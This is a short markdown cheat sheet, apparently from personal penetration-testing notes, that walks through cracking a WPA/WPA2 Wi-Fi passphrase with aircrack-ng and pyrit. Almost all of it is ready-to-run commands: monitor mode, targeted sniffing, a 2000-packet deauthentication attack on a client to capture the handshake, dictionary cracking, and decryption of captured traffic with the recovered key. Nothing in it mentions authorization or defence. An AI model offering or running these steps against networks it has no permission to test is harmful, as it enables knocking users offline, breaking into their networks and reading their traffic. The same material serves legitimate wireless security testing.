# Crack WPA/WPA2

### Enable Monitor Mode

* Kill these processes BEFORE putting the card in monitor mode

```text
airmon-ng check kill
```

* Enable monitor mode

```text
airmon-ng start wlan0
```

### Disable Monitor Mode

* Take card out of monitor mode

```text
airmon-ng stop wlan0mon
```

* Restart network manager

```text
service network-manager start
```

### Find and Sniff Network

* Find the network that we want

```text
airodump-ng wlan0mon
```

* Sniff and save packets

```text
airodump-ng --bssid <AP MAC> --channel <#> --write Desktop/WPAcapture wlan0mon
```

### Deauth Attack

* Find the devices on a network

```text
airodump-ng --bssid <AP MAC> --channel <#> wlan0mon
```

* Send deauth packets

```text
aireplay-ng --deauth 2000 -a <AP MAC> -c <TARGET MAC> wlan0mon
```

### Crack WPA / WPA2 Passphrase

* Capture handshake

```text
airodump-ng --bssid <AP MAC> --channel <#> --write Desktop/Captures/WPAsample wlan0mon
```

* Loop through passwords

```text
aircrack-ng Desktop/Captures/WPAsample-01.cap -w Desktop/Lists/passwords_top_1000.txt
```

* Decrypt packets

```text
airdecap-ng -e 'HOMEWIFI' -p bacon123 Desktop/Captures/WPAsample-01.cap
```

### Use pyrit for Faster Cracking \#\#

```text
pyrit list_cores
pyrit -r <CAPTURE FILE> analyze
pyrit eval
pyrit -i <PASS FILE> import_passwords
```

## Note: If you want to import more passwords, just use the same command with a different filename

```text
pyrit -e HOMEWIFI create_essid
pyrit eval
```

* Pyrit has automatically filtered passwords that are not suitable for WPA\(2\)-PSK and also sorted out duplicates

```text
pyrit batch
pyrit -r <CAPTURE FILE> attack_db
```

* Delete ESSID from database

```text
pyrit -e HOMEWIFI delete_essid
```

* Delete passwords

```text
rm -rf .pyrit/blobspace/password/
```